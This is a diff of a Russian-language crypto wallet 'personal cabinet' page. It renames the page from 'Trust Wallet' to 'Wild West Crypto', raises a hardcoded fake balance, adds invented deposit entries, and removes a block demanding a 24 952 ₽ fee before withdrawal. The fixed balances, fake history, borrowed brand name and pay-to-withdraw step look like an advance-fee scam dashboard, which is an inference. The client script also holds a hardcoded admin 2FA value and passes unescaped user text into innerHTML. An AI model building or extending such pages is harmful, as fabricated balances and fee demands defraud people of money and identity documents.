@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Trust Wallet — Личный кабинет</title>
+  <title>Wild West Crypto — Личный кабинет</title>
   <style>
     :root { 
       --bg: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
@@ -308,7 +308,36 @@
     .sidebar-menu {
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 16px;
+    }
+    .sidebar-menu-group-title {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-secondary);
+      margin: 8px 0 4px;
+      padding: 0 4px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      user-select: none;
+    }
+    .sidebar-menu-group-title::after {
+      content: '▾';
+      font-size: 10px;
+      opacity: 0.7;
+    }
+    .sidebar-menu-group.collapsed .sidebar-menu-group-title::after {
+      transform: rotate(-90deg);
+    }
+    .sidebar-menu-group {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+    .sidebar-menu-group.collapsed .sidebar-menu-item {
+      display: none;
     }
     .sidebar-menu-item {
       display: flex;
@@ -384,10 +413,11 @@
       z-index: 1;
     }
     .balance-card {
-      background: rgba(255,255,255,0.08);
-      border: 1px solid rgba(255,255,255,0.15);
-      border-radius: 20px;
-      padding: 32px;
+      background: radial-gradient(circle at top left, rgba(129,140,248,0.25), transparent 55%),
+                  rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 24px;
+      padding: 24px 28px;
       position: relative;
       overflow: hidden;
     }
@@ -412,6 +442,18 @@
       width: 18px;
       height: 18px;
     }
+    .balance-main {
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-between;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .balance-amount-group {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
     .balance-value {
       font-size: 42px;
       font-weight: 700;
@@ -419,10 +461,15 @@
       text-shadow: 0 0 20px rgba(99,102,241,0.3);
       margin-bottom: 16px;
     }
+    .balance-subvalue {
+      font-size: 14px;
+      color: var(--text-secondary);
+    }
     .balance-actions {
       display: flex;
       gap: 12px;
       flex-wrap: wrap;
+      justify-content: flex-end;
     }
     .btn {
       padding: 12px 24px;
@@ -1428,7 +1475,7 @@
     <div class="login-card">
       <div class="login-logo">
         <img src="icon/iconbalance.png" alt="Logo">
-        <h1 class="login-title">Trust Wallet</h1>
+        <h1 class="login-title">Wild West Crypto</h1>
         <p class="login-subtitle">Войдите в личный кабинет</p>
       </div>
       <form class="login-form" id="loginForm">
@@ -1463,7 +1510,7 @@
           </button>
           <div class="logo-header">
             <img src="icon/iconbalance.png" alt="Logo">
-            <span>Trust Wallet</span>
+            <span>Wild West Crypto</span>
           </div>
         </div>
         <div class="header-actions">
@@ -1489,37 +1536,64 @@
         </div>
       </div>
       <nav class="sidebar-menu">
-        <a href="#" class="sidebar-menu-item active" data-page="dashboard">
-          <img src="icon/iconbalance.png" alt="Главная">
-          <span>Главная</span>
-        </a>
-        <a href="#" class="sidebar-menu-item" data-page="withdrawal">
-          <img src="icon/iconlink.png" alt="Вывод">
-          <span>Вывод средств</span>
-        </a>
-        <a href="#" class="sidebar-menu-item" data-page="analytics">
-          <img src="icon/icon-stats.png" alt="Аналитика">
-          <span>Аналитика</span>
-        </a>
-        <a href="#" class="sidebar-menu-item" data-page="deposit">
-          <img src="icon/iconbalance.png" alt="Пополнение">
-          <span>Пополнение</span>
-        </a>
-        <a href="#" class="sidebar-menu-item" data-page="profile">
-          <img src="icon/iconbalance.png" alt="Профиль">
-          <span>Профиль</span>
-        </a>
-        <a href="#" class="sidebar-menu-item" data-page="history">
-          <img src="icon/iconl.png" alt="История">
-          <span>История</span>
-        </a>
+        <div class="sidebar-menu-group">
+          <div class="sidebar-menu-group-title">Обзор</div>
+          <a href="#" class="sidebar-menu-item active" data-page="dashboard">
+            <img src="icon/iconbalance.png" alt="Главная">
+            <span>Главная</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="wallet">
+            <img src="icon/iconbalance.png" alt="Кошелек">
+            <span>Кошелек</span>
+          </a>
+        </div>
+
+        <div class="sidebar-menu-group collapsed">
+          <div class="sidebar-menu-group-title">Финансы</div>
+          <a href="#" class="sidebar-menu-item" data-page="deposit">
+            <img src="icon/iconbalance.png" alt="Пополнение">
+            <span>Пополнить</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="withdrawal">
+            <img src="icon/iconlink.png" alt="Вывод">
+            <span>Вывести</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="transfers">
+            <img src="icon/iconlink.png" alt="Переводы">
+            <span>Переводы</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="swap">
+            <img src="icon/icon-stats.png" alt="Обменник">
+            <span>Обменник</span>
+          </a>
+        </div>
+
+        <div class="sidebar-menu-group collapsed">
+          <div class="sidebar-menu-group-title">Сервис</div>
+          <a href="#" class="sidebar-menu-item" data-page="referrals">
+            <img src="icon/icon-stats.png" alt="Рефералы">
+            <span>Рефералы</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="analytics">
+            <img src="icon/icon-stats.png" alt="Аналитика">
+            <span>Аналитика</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="history">
+            <img src="icon/iconl.png" alt="История">
+            <span>История</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="support">
+            <img src="icon/iconlink.png" alt="Поддержка">
+            <span>Поддержка</span>
+          </a>
+          <a href="#" class="sidebar-menu-item" data-page="profile">
+            <img src="icon/iconbalance.png" alt="Профиль">
+            <span>Профиль и настройки</span>
+          </a>
+        </div>
         <a href="#" class="sidebar-menu-item" data-page="withdrawalRequests" id="withdrawalRequestsMenuItem" style="display: none;">
           <img src="icon/iconlink.png" alt="Заявки на вывод">
           <span>Заявки на вывод</span>
-        </a>
-        <a href="#" class="sidebar-menu-item" data-page="payment" id="paymentMenuItem" style="display: none;">
-          <img src="icon/iconbalance.png" alt="Оплата">
-          <span>Оплата комиссии</span>
         </a>
         <!-- Админское меню -->
         <div id="adminMenu" style="display: none; margin-top: 24px; padding-top: 24px; border-top: 1px solid rgba(255,255,255,0.1);">
@@ -1558,33 +1632,25 @@
             <img src="icon/iconbalance.png" alt="Баланс">
             <span>Текущий баланс</span>
           </div>
-          <div class="balance-value" id="balanceValue" style="cursor: pointer; position: relative;" onclick="toggleBalanceVisibility()">946 366,94 ₽</div>
-          <div class="balance-actions">
-            <button class="btn btn-primary" onclick="showPage('withdrawal')">
-              Вывести средства
-            </button>
-            <button class="btn btn-primary" onclick="showPage('analytics')">
-              Аналитика
-            </button>
+          <div class="balance-main">
+            <div class="balance-amount-group">
+              <div class="balance-value" id="balanceValue" style="cursor: pointer; position: relative;" onclick="toggleBalanceVisibility()">1 463 025,00 ₽</div>
+              <div class="balance-subvalue" id="balanceValueUsd">
+                ≈ 18 507,19 $
+              </div>    
+            </div>
+            <div class="balance-actions">
+              <button class="btn btn-primary" onclick="showPage('withdrawal')">
+                Вывести средства
+              </button>
+              <button class="btn btn-primary" onclick="showPage('analytics')">
+                Аналитика
+              </button>
+            </div>
           </div>
         </div>
 
-        <div class="commission-card">
-          <div class="commission-header">
-            <div class="commission-icon">💳</div>
-            <h3>Комиссия за вывод</h3>
-          </div>
-          <div class="commission-amount" id="commissionAmount">24 952 ₽</div>
-          <div class="commission-info">
-            <p><strong>Размер комиссии:</strong> 24 952 ₽</p>
-            <p><strong>Описание:</strong> Комиссия взимается за обработку заявки на вывод средств</p>
-            <p><strong>Статус:</strong> <span style="color: var(--accent);">Требуется оплата</span></p>
-          </div>
-          <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 16px; line-height: 1.6;">
-            Для вывода средств необходимо оплатить комиссию. После оплаты заявка будет обработана в течение 1-3 рабочих дней.
-          </p>
-          <button class="commission-btn" id="payCommissionBtn" onclick="showPage('payment')">Оплатить комиссию</button>
-        </div>
+        <!-- Блок комиссии скрыт, так как комиссия отключена -->
 
       </div>
     </div>
@@ -1596,7 +1662,7 @@
           <h2>Вывод средств</h2>
           <div class="alert alert-info">
             <span>💡</span>
-            <span>Минимальная сумма вывода: 1 000 ₽. Комиссия за вывод: 24 952 ₽</span>
+            <span>Минимальная сумма вывода: 1 000 ₽. Комиссия не взимается.</span>
           </div>
           <div class="form-row">
             <div class="form-field">
@@ -1707,6 +1773,16 @@
             <div class="stat-card-label">Общий доход (все время)</div>
             <div class="stat-card-value positive">+946 366,94 ₽</div>
             <div class="stat-card-details">Накопленный доход за весь период работы</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-card-label">Предыдущий баланс</div>
+            <div class="stat-card-value">946 366,94 ₽</div>
+            <div class="stat-card-details">Баланс до последнего увеличения депозита</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-card-label">Текущий баланс</div>
+            <div class="stat-card-value">1 463 025,00 ₽</div>
+            <div class="stat-card-details">Фактический баланс на счете сейчас</div>
           </div>
           <div class="stat-card">
             <div class="stat-card-label">За сегодня</div>
@@ -1949,6 +2025,26 @@
             </div>
           </div>
         </div>
+
+        <div class="profile-card">
+          <h3>Настройки аккаунта</h3>
+          <div class="profile-item">
+            <div class="profile-item-label">Безопасность входа</div>
+            <button class="btn btn-secondary" onclick="showPage('security')" style="padding: 6px 14px; font-size: 13px;">Открыть раздел безопасности</button>
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">Верификация (KYC)</div>
+            <button class="btn btn-secondary" onclick="showPage('kyc')" style="padding: 6px 14px; font-size: 13px;">Управлять верификацией</button>
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">Мой секретный ID</div>
+            <button class="btn btn-secondary" onclick="showPage('secretId')" style="padding: 6px 14px; font-size: 13px;">Посмотреть ID и историю</button>
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">Адресная книга</div>
+            <button class="btn btn-secondary" onclick="showPage('addressBook')" style="padding: 6px 14px; font-size: 13px;">Открыть адреса и шаблоны</button>
+          </div>
+        </div>
       </div>
     </div>
 
@@ -1963,7 +2059,7 @@
         <div class="history-item">
           <div class="history-info">
             <div class="history-type">Отмена вывода</div>
-            <div class="history-date">Сегодня</div>
+            <div class="history-date">01.03.2026, 10:36</div>
           </div>
           <div class="history-amount positive">+400 000 ₽</div>
         </div>
@@ -1994,6 +2090,13 @@
         <div class="history-item">
           <div class="history-info">
             <div class="history-type">Пополнение с карты</div>
+            <div class="history-date">13.03.2026, 15:36</div>
+          </div>
+          <div class="history-amount positive">+516 658 ₽</div>
+        </div>
+        <div class="history-item">
+          <div class="history-info">
+            <div class="history-type">Пополнение с карты</div>
             <div class="history-date">02.11.2025, 23:46</div>
           </div>
           <div class="history-amount positive">+356 000 ₽</div>
@@ -2011,6 +2114,388 @@
             <div class="history-date">27.10.2025, 14:10</div>
           </div>
           <div class="history-amount positive">+25 000 ₽</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Страница кошелька -->
+    <div class="page" id="walletPage">
+      <h2 class="section-title">
+        <img src="icon/iconbalance.png" alt="Кошелек">
+        <span>Кошелек</span>
+      </h2>
+      <p style="color: var(--text-secondary); margin-bottom: 16px;">Здесь отображаются балансы по всем валютам и краткая сводка.</p>
+      <div id="walletAssetsList" class="stats-grid"></div>
+    </div>
+
+    <!-- Внутренние переводы -->
+    <div class="page" id="transfersPage">
+      <div class="withdrawal-form">
+        <div class="form-card">
+          <h2>Внутренние переводы</h2>
+          <p style="color: var(--text-secondary); margin-bottom: 16px;">Перевод между пользователями по секретному ID внутри системы.</p>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="transferSecretId">Секретный ID получателя</label>
+              <input type="text" id="transferSecretId" placeholder="Например, DV-7X9K">
+            </div>
+            <div class="form-field">
+              <label for="transferAmount">Сумма перевода (₽)</label>
+              <input type="number" id="transferAmount" placeholder="Введите сумму" min="1" step="0.01">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-field">
+              <label>Комиссия (0,5%)</label>
+              <input type="text" id="transferFee" readonly placeholder="0,00 ₽">
+            </div>
+            <div class="form-field">
+              <label>Итого к списанию</label>
+              <input type="text" id="transferTotal" readonly placeholder="0,00 ₽">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-field">
+              <label>Получатель</label>
+              <input type="text" id="transferReceiverPreview" readonly placeholder="Имя получателя будет показано здесь">
+            </div>
+          </div>
+          <div class="form-actions">
+            <button class="btn btn-primary" id="submitTransferBtn">Перевести</button>
+            <button class="btn btn-secondary" onclick="showPage('dashboard')">Отмена</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Мой секретный ID -->
+    <div class="page" id="secretIdPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/iconlink.png" alt="Секретный ID">
+          <span>Мой секретный ID</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Ваш уникальный ID</h3>
+          <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 12px;">
+            <input type="text" id="secretIdValue" readonly style="background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 8px 12px; color: var(--text); outline: none; flex: 1; min-width: 150px; max-width: 200px;">
+            <button class="copy-btn" id="copySecretIdBtn">Копировать</button>
+            <button class="btn btn-secondary" id="regenerateSecretIdBtn">Сменить ID</button>
+          </div>
+          <p style="color: var(--text-secondary); font-size: 14px;">Передавайте этот ID только доверенным людям для получения переводов.</p>
+        </div>
+        <div class="profile-card">
+          <h3>История переводов по ID</h3>
+          <div id="secretIdHistory" style="font-size: 14px; color: var(--text-secondary);">
+            Пока нет переводов.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Обменник -->
+    <div class="page" id="swapPage">
+      <div class="withdrawal-form">
+        <div class="form-card">
+          <h2>Обменник</h2>
+          <p style="color: var(--text-secondary); margin-bottom: 16px;">Обменивайте одну валюту на другую по внутреннему курсу.</p>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="swapFromCurrency">Отдаю</label>
+              <select id="swapFromCurrency">
+                <option value="USDT">USDT</option>
+                <option value="BTC">BTC</option>
+                <option value="ETH">ETH</option>
+              </select>
+            </div>
+            <div class="form-field">
+              <label for="swapToCurrency">Получаю</label>
+              <select id="swapToCurrency">
+                <option value="BTC">BTC</option>
+                <option value="ETH">ETH</option>
+                <option value="USDT">USDT</option>
+              </select>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="swapAmount">Сумма обмена</label>
+              <input type="number" id="swapAmount" placeholder="Введите сумму" min="0" step="0.0001">
+            </div>
+            <div class="form-field">
+              <label for="swapResult">Вы получите (примерно)</label>
+              <input type="text" id="swapResult" readonly placeholder="0">
+            </div>
+          </div>
+          <p style="color: var(--text-secondary); font-size: 13px; margin-bottom: 12px;">Курс и итоговая сумма носят демонстрационный характер.</p>
+          <div class="form-actions">
+            <button class="btn btn-primary" id="submitSwapBtn">Обменять</button>
+            <button class="btn btn-secondary" onclick="showPage('dashboard')">Отмена</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Проценты на остаток -->
+    <div class="page" id="savingsPage">
+      <div class="analytics-section">
+        <h2 class="section-title">
+          <img src="icon/icon-stats.png" alt="Проценты">
+          <span>Проценты на остаток</span>
+        </h2>
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-card-label">Ставка по счету</div>
+            <div class="stat-card-value positive">+4,5% годовых</div>
+            <div class="stat-card-details">Проценты начисляются ежедневно на остаток.</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-card-label">Начислено процентов</div>
+            <div class="stat-card-value">0,00 ₽</div>
+            <div class="stat-card-details">Демонстрационные данные.</div>
+          </div>
+        </div>
+        <div class="withdrawal-form" style="margin-top: 24px;">
+          <div class="form-card">
+            <h3>Калькулятор доходности</h3>
+            <div class="form-row">
+              <div class="form-field">
+                <label for="savingsAmount">Сумма на счете (₽)</label>
+                <input type="number" id="savingsAmount" placeholder="Введите сумму" min="0" step="0.01">
+              </div>
+              <div class="form-field">
+                <label for="savingsYearIncome">Доход за год (₽)</label>
+                <input type="text" id="savingsYearIncome" readonly placeholder="0,00 ₽">
+              </div>
+            </div>
+            <button class="btn btn-primary" id="savingsCalcBtn">Рассчитать</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Платежные карты -->
+    <div class="page" id="cardsPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/iconbalance.png" alt="Карты">
+          <span>Платежные карты</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Виртуальная карта</h3>
+          <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Оплачивайте онлайн-покупки с баланса кошелька.</p>
+          <button class="btn btn-primary" id="orderVirtualCardBtn">Заказать виртуальную карту</button>
+        </div>
+        <div class="profile-card">
+          <h3>Физическая карта</h3>
+          <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Карта для покупок в магазинах и снятия наличных.</p>
+          <button class="btn btn-primary" id="orderPhysicalCardBtn">Заказать физическую карту</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Безопасность -->
+    <div class="page" id="securityPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/iconbalance.png" alt="Безопасность">
+          <span>Безопасность</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Пароль и вход</h3>
+          <div class="profile-item">
+            <div class="profile-item-label">Смена пароля</div>
+            <button class="btn btn-secondary" id="changePasswordBtn">Сменить пароль</button>
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">Двухфакторная аутентификация (2FA)</div>
+            <div class="profile-toggle">
+              <span style="font-size: 14px; color: var(--text-secondary);" id="twoFaStatus">Отключена</span>
+              <div class="toggle-switch" id="twoFaToggle"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Верификация (KYC) -->
+    <div class="page" id="kycPage">
+      <div class="withdrawal-form">
+        <div class="form-card">
+          <h2>Верификация личности (KYC)</h2>
+          <div class="alert alert-info">
+            <span>💡</span>
+            <span>Заполните данные и загрузите документы, чтобы увеличить лимиты.</span>
+          </div>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="kycStatus">Статус верификации</label>
+              <input type="text" id="kycStatus" readonly value="Не пройдена">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="kycPassport">Фото паспорта</label>
+              <input type="file" id="kycPassport">
+            </div>
+            <div class="form-field">
+              <label for="kycSelfie">Селфи с документом</label>
+              <input type="file" id="kycSelfie">
+            </div>
+          </div>
+          <div class="form-actions">
+            <button class="btn btn-primary" id="submitKycBtn">Отправить на проверку</button>
+            <button class="btn btn-secondary" onclick="showPage('dashboard')">Позже</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Адресная книга -->
+    <div class="page" id="addressBookPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/iconlink.png" alt="Адресная книга">
+          <span>Адресная книга</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Добавить адрес</h3>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="addressLabel">Название (например, Binance)</label>
+              <input type="text" id="addressLabel" placeholder="Название">
+            </div>
+            <div class="form-field">
+              <label for="addressValue">Адрес кошелька / ID</label>
+              <input type="text" id="addressValue" placeholder="Адрес или ID">
+            </div>
+          </div>
+          <button class="btn btn-primary" id="addAddressBtn">Добавить в адресную книгу</button>
+        </div>
+        <div class="profile-card">
+          <h3>Сохраненные адреса</h3>
+          <div id="addressBookList" style="font-size: 14px; color: var(--text-secondary);">
+            Адресов пока нет.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Настройки -->
+    <div class="page" id="settingsPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/iconbalance.png" alt="Настройки">
+          <span>Настройки</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Общие</h3>
+          <div class="profile-item">
+            <div class="profile-item-label">Язык интерфейса</div>
+            <select id="settingsLanguage">
+              <option value="ru">Русский</option>
+              <option value="en">English</option>
+            </select>
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">Валюта отображения</div>
+            <select id="settingsCurrency">
+              <option value="RUB">RUB</option>
+              <option value="USD">USD</option>
+              <option value="EUR">EUR</option>
+            </select>
+          </div>
+        </div>
+        <div class="profile-card">
+          <h3>Настройки кошелька</h3>
+          <div class="profile-item">
+            <div class="profile-item-label">Показывать долларовый эквивалент баланса</div>
+            <input type="checkbox" id="walletShowUsd" checked>
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">Скрывать нулевые валюты в кошельке</div>
+            <input type="checkbox" id="walletHideZero">
+          </div>
+        </div>
+        <div class="profile-card">
+          <h3>Уведомления</h3>
+          <div class="profile-item">
+            <div class="profile-item-label">При входе в аккаунт</div>
+            <input type="checkbox" id="notifyLogin">
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">При пополнении</div>
+            <input type="checkbox" id="notifyDeposit">
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">При выводе</div>
+            <input type="checkbox" id="notifyWithdraw">
+          </div>
+          <div class="profile-item">
+            <div class="profile-item-label">При переводе</div>
+            <input type="checkbox" id="notifyTransfer">
+          </div>
+        </div>
+        <button class="btn btn-primary" id="saveSettingsBtn">Сохранить настройки</button>
+      </div>
+    </div>
+
+    <!-- Партнерская программа -->
+    <div class="page" id="referralsPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/icon-stats.png" alt="Рефералы">
+          <span>Партнерская программа</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Ваша реферальная ссылка</h3>
+          <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 12px;">
+            <input type="text" id="referralLink" readonly style="background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 8px 12px; color: var(--text); outline: none; flex: 1; min-width: 200px;">
+            <button class="copy-btn" id="copyReferralLinkBtn">Копировать</button>
+          </div>
+        </div>
+        <div class="profile-card">
+          <h3>Статистика по рефералам</h3>
+          <div class="stats-grid">
+            <div class="stat-card">
+              <div class="stat-card-label">Приведено друзей</div>
+              <div class="stat-card-value">18</div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-label">Доход с рефералов</div>
+              <div class="stat-card-value">35 658,00 ₽</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Поддержка -->
+    <div class="page" id="supportPage">
+      <div class="profile-section">
+        <h2 class="section-title">
+          <img src="icon/iconlink.png" alt="Поддержка">
+          <span>Поддержка</span>
+        </h2>
+        <div class="profile-card">
+          <h3>Чат с поддержкой</h3>
+          <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Онлайн-чат доступен в интерфейсе приложения (демо-режим).</p>
+        </div>
+        <div class="profile-card">
+          <h3>Обращение в поддержку</h3>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="supportTopic">Тема</label>
+              <input type="text" id="supportTopic" placeholder="Кратко опишите проблему">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-field">
+              <label for="supportMessage">Сообщение</label>
+              <textarea id="supportMessage" rows="4" placeholder="Опишите ситуацию"></textarea>
+            </div>
+          </div>
+          <button class="btn btn-primary" id="submitSupportTicketBtn">Отправить обращение</button>
         </div>
       </div>
     </div>
@@ -2214,8 +2699,12 @@
     const ADMIN_2FA = 'admin2fa2024';
     
     // Баланс
-    let balanceRub = 946366.94;
-    const commissionAmount = 24952;
+    // Текущий баланс в рублях
+    let balanceRub = 1463025;
+    // Фиксированный курс для перевода в доллары
+    const USD_RATE = 79.07;
+    // Комиссия (убрана по запросу, 0 ₽)
+    const commissionAmount = 0;
     let withdrawalRequests = JSON.parse(localStorage.getItem('withdrawalRequests') || '[]');
 
     // Получение названий месяцев
@@ -2240,6 +2729,56 @@
       });
     }
 
+    // Демонстрационные данные для кошелька
+    const walletAssets = [
+      { code: 'USDT', name: 'Tether USDT', amount: 18402 },
+      { code: 'BTC', name: 'Bitcoin', amount: 0.12 },
+      { code: 'ETH', name: 'Ethereum', amount: 0.85}
+    ];
+
+    function renderWallet() {
+      const container = document.getElementById('walletAssetsList');
+      if (!container) return;
+
+      container.innerHTML = '';
+      walletAssets.forEach(asset => {
+        const card = document.createElement('div');
+        card.className = 'stat-card';
+        const usdValue = asset.code === 'USDT'
+          ? asset.amount
+          : asset.amount * 100; // условный пересчет для демо
+        const rubValue = usdValue * USD_RATE;
+        card.innerHTML = `
+          <div class="stat-card-label">${asset.name} (${asset.code})</div>
+          <div class="stat-card-value">${asset.amount.toLocaleString('ru-RU', {maximumFractionDigits: 8})}</div>
+          <div class="stat-card-details">≈ ${usdValue.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2})} $ / ${rubValue.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2})} ₽</div>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    // Адресная книга
+    let addressBook = JSON.parse(localStorage.getItem('addressBook') || '[]');
+
+    function renderAddressBook() {
+      const container = document.getElementById('addressBookList');
+      if (!container) return;
+      if (addressBook.length === 0) {
+        container.textContent = 'Адресов пока нет.';
+        return;
+      }
+      container.innerHTML = '';
+      addressBook.forEach((entry, index) => {
+        const div = document.createElement('div');
+        div.style.marginBottom = '8px';
+        div.innerHTML = `
+          <strong>${entry.label}</strong><br>
+          <span style="font-size: 13px;">${entry.value}</span>
+        `;
+        container.appendChild(div);
+      });
+    }
+
     // Элементы
     const loginPage = document.getElementById('loginPage');
     const appContainer = document.getElementById('appContainer');
@@ -2249,7 +2788,7 @@
     const sidebar = document.getElementById('sidebar');
     const sidebarOverlay = document.getElementById('sidebarOverlay');
     const logoutBtn = document.getElementById('logoutBtn');
-    const sidebarMenuItems = document.querySelectorAll('.sidebar-menu-item');
+      const sidebarMenuItems = document.querySelectorAll('.sidebar-menu-item');
     const payCommissionBtn = document.getElementById('payCommissionBtn');
     const modalOverlay = document.getElementById('modalOverlay');
     const modal = document.getElementById('modal');
@@ -2348,8 +2887,8 @@
       const sidebarUserInfo = document.getElementById('sidebarUserInfo');
       const sidebarUserAvatar = document.getElementById('sidebarUserAvatar');
       
-      // Получаем все пункты меню пользователя
-      const userMenuItems = document.querySelectorAll('.sidebar-menu-item[data-page="withdrawal"], .sidebar-menu-item[data-page="analytics"], .sidebar-menu-item[data-page="deposit"], .sidebar-menu-item[data-page="profile"], .sidebar-menu-item[data-page="history"]');
+      // Получаем все пункты меню пользователя (кроме админских)
+      const userMenuItems = document.querySelectorAll('.sidebar-menu-item[data-page="dashboard"], .sidebar-menu-item[data-page="wallet"], .sidebar-menu-item[data-page="deposit"], .sidebar-menu-item[data-page="withdrawal"], .sidebar-menu-item[data-page="transfers"], .sidebar-menu-item[data-page="swap"], .sidebar-menu-item[data-page="referrals"], .sidebar-menu-item[data-page="analytics"], .sidebar-menu-item[data-page="history"], .sidebar-menu-item[data-page="support"], .sidebar-menu-item[data-page="profile"]');
       
       if (role === 'admin') {
         adminMenu.style.display = 'block';
@@ -2473,6 +3012,15 @@
       sidebarOverlay.classList.remove('active');
     });
 
+    // Сворачиваемые группы меню
+    document.querySelectorAll('.sidebar-menu-group').forEach(group => {
+      const title = group.querySelector('.sidebar-menu-group-title');
+      if (!title) return;
+      title.addEventListener('click', () => {
+        group.classList.toggle('collapsed');
+      });
+    });
+
     // Навигация по страницам
     function showPage(pageId) {
       document.querySelectorAll('.page').forEach(page => {
@@ -2513,6 +3061,10 @@
         initAccountFreezeToggle();
       } else if (pageId === 'dashboard') {
         updateFrozenAccountWarning();
+      } else if (pageId === 'wallet') {
+        renderWallet();
+      } else if (pageId === 'addressBook') {
+        renderAddressBook();
       } else if (pageId === 'deposit') {
         // Обновляем назначение платежа при открытии страницы пополнения
         const depositAmount = document.getElementById('depositAmount');
@@ -2775,6 +3327,33 @@
       });
     }
 
+    // Внутренние переводы
+    const transferAmountInput = document.getElementById('transferAmount');
+    const transferFeeInput = document.getElementById('transferFee');
+    const transferTotalInput = document.getElementById('transferTotal');
+    if (transferAmountInput && transferFeeInput && transferTotalInput) {
+      transferAmountInput.addEventListener('input', () => {
+        const amount = parseFloat(transferAmountInput.value) || 0;
+        const fee = amount * 0.005;
+        const total = amount + fee;
+        transferFeeInput.value = fee.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + ' ₽';
+        transferTotalInput.value = total.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + ' ₽';
+      });
+    }
+
+    const submitTransferBtn = document.getElementById('submitTransferBtn');
+    if (submitTransferBtn) {
+      submitTransferBtn.addEventListener('click', () => {
+        const secretId = document.getElementById('transferSecretId')?.value.trim();
+        const amount = parseFloat(document.getElementById('transferAmount')?.value || '0');
+        if (!secretId || !amount || amount <= 0) {
+          showAlert('Введите секретный ID получателя и сумму перевода', 'warning');
+          return;
+        }
+        showAlert('Внутренний перевод создан (демо). В реальной системе здесь будет обработка транзакции.', 'success');
+      });
+    }
+
     // Отображение заявок на вывод для пользователя
     function renderWithdrawalRequests() {
       const container = document.getElementById('withdrawalRequestsList');
@@ -3010,6 +3589,7 @@
     let balanceHidden = localStorage.getItem('balanceHidden') === 'true';
     let accountFrozen = localStorage.getItem('accountFrozen') === 'true';
     let userNickname = localStorage.getItem('userNickname') || 'saidik05';
+    let secretId = localStorage.getItem('secretId') || '';
 
     // Копирование в буфер обмена
     window.copyToClipboard = function(text, button) {
